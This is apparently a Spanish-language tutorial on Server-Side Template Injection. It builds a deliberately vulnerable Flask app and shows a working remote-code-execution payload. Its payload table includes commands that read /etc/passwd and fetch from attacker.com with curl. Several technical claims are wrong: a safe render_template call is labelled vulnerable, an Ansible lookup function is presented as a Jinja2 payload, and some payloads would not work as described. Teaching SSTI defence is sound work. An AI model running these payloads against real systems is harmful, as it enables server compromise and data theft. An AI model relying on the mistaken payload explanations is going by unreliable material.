---
icon: sidebar-flip
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# SSTI (Server-Side Template Injection)

## Practica de explotación SSTI

Imaginemos que tenemos una pagina web asi:

```python
import os
from flask import Flask, request, render_template_string, session, redirect, url_for

app = Flask(__name__)
app.secret_key = 'supersecretkey'  # Clave secreta para sesiones

# Base de datos simple en memoria (solo para prueba)
users = {
    'admin': {'password': 'admin123', 'avatar': 'default.jpg', 'name': 'Admin'},
    'user': {'password': 'user123', 'avatar': 'default.jpg', 'name': 'Usuario'}
}

@app.route('/', methods=['GET', 'POST'])
def login():
    """ Página de inicio de sesión """
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        if username in users and users[username]['password'] == password:
            session['username'] = username
            return redirect(url_for('profile'))

    return '''
        <form method="post">
            Usuario: <input name="username" style="padding: 10px; margin: 10px; font-size: 16px;" required><br>
            Contraseña: <input name="password" type="password" style="padding: 10px; margin: 10px; font-size: 16px;" required><br>
            <input type="submit" value="Iniciar sesión" style="background-color: #4CAF50; color: white; padding: 12px 20px; font-size: 16px; border-radius: 5px; cursor: pointer; border: none;">
        </form>
    '''

@app.route('/profile', methods=['GET', 'POST'])
def profile():
    """ Página de perfil con vulnerabilidad SSTI """
    if 'username' not in session:
        return redirect(url_for('login'))

    username = session['username']
    avatar = users[username]['avatar']

    if request.method == 'POST':
        new_name = request.form['new_name']
        # ⚠️ **Vulnerabilidad SSTI intencionada** ⚠️
        users[username]['name'] = render_template_string(new_name) # Se almacena directamente el input del usuario

    return render_template_string('''
        <html lang="es">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Perfil de {{ name }}</title>
            <style>
                body {
                    font-family: 'Arial', sans-serif;
                    background-color: #f4f7fc;
                    color: #333;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    height: 100vh;
                    margin: 0;
                }
                h1 {
                    color: #4CAF50;
                    margin-bottom: 20px;
                }
                img {
                    border-radius: 50%;
                    margin-bottom: 20px;
                }
                form {
                    background-color: white;
                    padding: 20px;
                    border-radius: 8px;
                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                    margin-bottom: 20px;
                    width: 300px;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                }
                input[type="text"], input[type="file"] {
                    padding: 10px;
                    font-size: 1em;
                    width: 100%;
                    border: 1px solid #ccc;
                    border-radius: 5px;
                    margin-bottom: 10px;
                }
                input[type="submit"] {
                    background-color: #4CAF50;
                    color: white;
                    padding: 12px 20px;
                    font-size: 1em;
                    border-radius: 5px;
                    border: none;
                    cursor: pointer;
                    transition: background-color 0.3s;
                }
                input[type="submit"]:hover {
                    background-color: #45a049;
                }
                a {
                    text-decoration: none;
                    color: #4CAF50;
                    font-weight: bold;
                    margin-top: 20px;
                }
                a:hover {
                    color: #45a049;
                }
            </style>
        </head>
        <body>
            <h1>Perfil de {{ name }}</h1>
            <img src="{{ url_for('static', filename=avatar) }}" alt="Avatar de {{ name }}" width="150">

            <h3>Actualizar nombre</h3>
            <form method="post">
                Nuevo nombre: <input type="text" name="new_name" required><br>
                <input type="submit" value="Actualizar">
            </form>

            <h3>Subir avatar</h3>
            <form action="{{ url_for('upload') }}" method="post" enctype="multipart/form-data">
                <input type="file" name="avatar" required><br>
                <input type="submit" value="Subir imagen">
            </form>

            <br>
            <a href="{{ url_for('logout') }}">Cerrar sesión</a>
        </body>
        </html>
    ''', name=users[username]['name'], avatar=avatar)

@app.route('/upload', methods=['POST'])
def upload():
    """ Cargar un avatar directamente en static """
    if 'username' not in session:
        return redirect(url_for('login'))

    username = session['username']
    file = request.files['avatar']

    if file:
        # Asegúrate de usar una ruta absoluta
        file_path = os.path.join(app.root_path, 'static', file.filename)
        file.save(file_path)
        users[username]['avatar'] = file.filename  # Actualizamos el avatar del usuario con el nuevo archivo

    return redirect(url_for('profile'))

@app.route('/logout')
def logout():
    """ Cierra la sesión del usuario """
    session.pop('username', None)
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)  # Usa otro puerto si Apache ya usa el 80
```

Vemos que la vulnerabilidad esta en esta linea de codigo:

```python
if request.method == 'POST':
        new_name = request.form['new_name']
        # ⚠️ **Vulnerabilidad SSTI intencionada** ⚠️
        users[username]['name'] = render_template_string(new_name) # Se almacena directamente el input del usuario
```

Si nos metemos en la pagina web, vamos a ver lo siguiente:

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Meteremos las credenciales que ya sabemos por defecto `user:user123`, echo esto veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que hay varios apartados, pero entre ellos esta la opcion de poder cambiar el nombre de usuario, vamos a probar a insertar algo como esto:

```
{{7*7}}
```

Esto deberia de dar como resultado `49`, si es asi veremos que es vulnerable a un `SSTI`:

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que esta funcionando, por lo que vamos a probar a intentar ejecutar codigo de forma remota, de la siguiente forma:

```
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
```

<figure><img src="../../.gitbook/assets/image (289).png" alt=""><figcaption></figcaption></figure>

Vemos que esta funcionando, por lo que habremos aprovechado bien esta vulnerabilidad y podremos ejecutar codigo de forma remota hacia el servidor.

## Explicación detallada SSTI

### **Vulnerabilidad SSTI (Server-Side Template Injection)**

**Definición:** La **SSTI** (Inyección de Plantilla del Lado del Servidor) es una vulnerabilidad que ocurre cuando los datos de entrada proporcionados por un usuario no se validan correctamente y son directamente inyectados en un motor de plantillas en el lado del servidor. Los motores de plantillas, como Jinja2 (usado en Python) o Twig (usado en PHP), son utilizados por muchas aplicaciones para renderizar contenido dinámico basado en datos proporcionados por el servidor o el cliente.

Cuando un atacante es capaz de inyectar código malicioso dentro de una plantilla y la plantilla se ejecuta en el servidor, pueden ocurrir varios efectos, como la ejecución remota de código, la exposición de información sensible, el acceso a recursos internos del servidor, y más.

**Cómo funciona la vulnerabilidad SSTI:** En el contexto de una aplicación web, el motor de plantillas toma datos dinámicos y los inserta en una plantilla para generar el contenido HTML. Si los datos proporcionados por el usuario se inyectan en una plantilla sin ninguna validación o saneamiento, los atacantes pueden manipular la plantilla para ejecutar código arbitrario en el servidor.

Un ejemplo clásico de inyección de plantillas podría ser un formulario donde el usuario envía un parámetro que es utilizado directamente por el motor de plantillas para generar la respuesta del servidor:

```python
@app.route('/user')
def user():
    username = request.args.get('username')
    return render_template('profile.html', username=username)
```

Si el parámetro `username` no es validado correctamente, un atacante podría enviar un payload malicioso como `{{ config }}` o `{{ 7*7 }}`, lo que podría permitirle acceder a información sensible o ejecutar operaciones en el servidor.

***

### **Impactos de SSTI:**

1. **Ejecución remota de código**: Los atacantes pueden inyectar código que será ejecutado por el servidor, lo que les permite ejecutar comandos arbitrarios en el servidor y comprometer la seguridad de la aplicación.
2. **Acceso a datos sensibles**: Un atacante podría acceder a la configuración del servidor o a variables internas como contraseñas, claves API, información de usuarios, etc.
3. **Acceso a recursos internos**: Si el motor de plantillas tiene acceso a archivos o servicios internos, el atacante podría explotar esto para obtener más información o comprometer el sistema.
4. **Denegación de servicio (DoS)**: Al inyectar plantillas maliciosas que consumen demasiados recursos del servidor, un atacante podría provocar que el servidor se caiga o ralentice considerablemente.
5. **Escalado de privilegios**: En algunos casos, un atacante podría aprovechar la ejecución de código para escalar sus privilegios en el servidor.

***

#### **Cómo prevenir la vulnerabilidad SSTI:**

1. **Validar y sanitizar las entradas**: Cualquier dato que se inyecte en una plantilla debe ser validado y sanitizado adecuadamente para evitar la ejecución de código malicioso.
2. **Usar plantillas de solo texto o escapado seguro**: Asegúrate de que los motores de plantillas estén configurados para escapar correctamente los datos de entrada, evitando que el código proporcionado por el atacante se ejecute. Algunos motores de plantillas proporcionan opciones para escapar automáticamente el contenido.
3. **Deshabilitar las funciones peligrosas en el motor de plantillas**: En algunos motores de plantillas, puedes desactivar funciones que permiten la ejecución de código, como el acceso a variables del sistema o a funciones como `exec`, `eval`, etc.
4. **Revisar y actualizar las bibliotecas**: Mantén actualizadas las bibliotecas de plantillas que usas, ya que las actualizaciones pueden solucionar vulnerabilidades conocidas.

***

#### **Tabla de Payloads y Bypasses para SSTI**

Aquí tienes algunos **payloads comunes y bypasses** para explotar vulnerabilidades SSTI, junto con explicaciones de cómo funcionan y cómo pueden ser utilizados.

| **Descripción**                                     | **Payload/Bypass**                                                                                     | **Explicación**                                                                                                                    |
| --------------------------------------------------- | ------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------- |
| **Acceder a variables del sistema**                 | `{{ config }}`                                                                                         | En aplicaciones Python con Jinja2, `{{ config }}` puede mostrar la configuración del servidor, lo que revela información sensible. |
| **Ejecutar operaciones matemáticas**                | `{{ 7*7 }}`                                                                                            | Permite a un atacante realizar operaciones dentro del motor de plantillas para probar si tiene capacidad de ejecutar código.       |
| **Acceder a variables de entorno**                  | `{{ os.environ }}`                                                                                     | En aplicaciones con Jinja2 o Twig, esto puede permitir al atacante acceder a las variables de entorno del servidor.                |
| **Acceder a archivos del sistema (Python)**         | `{{ lookup('file', '/etc/passwd') }}`                                                                  | Permite al atacante leer archivos sensibles del sistema como `/etc/passwd` en sistemas Linux.                                      |
| **Ejecutar código arbitrario (Python)**             | `{{ ''.__class__.__mro__[1].__subclasses__()[59]('ls').communicate() }}`                               | En aplicaciones Python con Jinja2, este payload ejecuta el comando `ls` para listar archivos en el sistema.                        |
| **Ejecución remota de comandos (PHP)**              | `{{ phpinfo() }}`                                                                                      | En aplicaciones PHP con Twig o Blade, este payload ejecuta la función `phpinfo()`, que revela detalles del servidor.               |
| **Acceso a rutas del sistema de archivos (PHP)**    | `{{ include('file:///etc/passwd') }}`                                                                  | Permite al atacante incluir archivos locales, como `/etc/passwd`, dentro de la respuesta generada por la plantilla.                |
| **Desbordamiento de pila (Denegación de servicio)** | `{{ ''.join(['a'*1000]*1000) }}`                                                                       | En aplicaciones con plantillas que no validan adecuadamente, este tipo de carga puede agotar recursos del servidor.                |
| **Ejecución de comandos (Node.js)**                 | `{{ require('child_process').execSync('ls').toString() }}`                                             | En aplicaciones Node.js que usan motores de plantillas como EJS, este payload ejecuta el comando `ls` en el servidor.              |
| **Explotación de funciones internas (Python)**      | `{{ ''.__class__.__mro__[1].__subclasses__()[59]('cat /etc/passwd').communicate() }}`                  | Permite ejecutar comandos del sistema en el servidor, revelando archivos sensibles como `/etc/passwd`.                             |
| **Acceso a servicios internos (HTTP Request)**      | `{{ ''.__class__.__mro__[1].__subclasses__()[59]('curl http://attacker.com/malware').communicate() }}` | Puede usarse para realizar una solicitud HTTP a un servidor controlado por el atacante.                                            |

***

#### **Protección contra SSTI**

1. **Escape de todas las entradas**: Asegúrate de que todas las entradas de los usuarios sean escapadas correctamente antes de ser utilizadas en una plantilla. En Jinja2, por ejemplo, esto puede lograrse mediante el uso de `{{ input | e }}` para escapar los datos de forma segura.
2. **Desactivar funciones peligrosas**: Desactiva todas las funciones peligrosas del motor de plantillas. Por ejemplo, en Jinja2, se puede hacer esto configurando adecuadamente el entorno de renderización para evitar que se pueda acceder a objetos peligrosos como `exec` o `eval`.
3. **Usar motores de plantillas seguros**: Algunos motores de plantillas permiten deshabilitar la ejecución de código. Usa estas configuraciones seguras para prevenir la ejecución no deseada de código.
4. **Revisión y control de las bibliotecas**: Mantén actualizadas las bibliotecas de plantillas, ya que las versiones más recientes generalmente incluyen correcciones para vulnerabilidades conocidas, como SSTI.

***

#### **Conclusión**

La vulnerabilidad **SSTI** es peligrosa porque permite a los atacantes ejecutar código arbitrario en el servidor, acceder a datos sensibles o realizar otros ataques maliciosos. Para proteger tu aplicación web de esta vulnerabilidad, es esencial validar y sanitizar las entradas, deshabilitar funciones peligrosas en el motor de plantillas y usar configuraciones seguras en el servidor. Con estas medidas, puedes mitigar los riesgos asociados con las inyecciones de plantillas y mejorar la seguridad de tu aplicación.
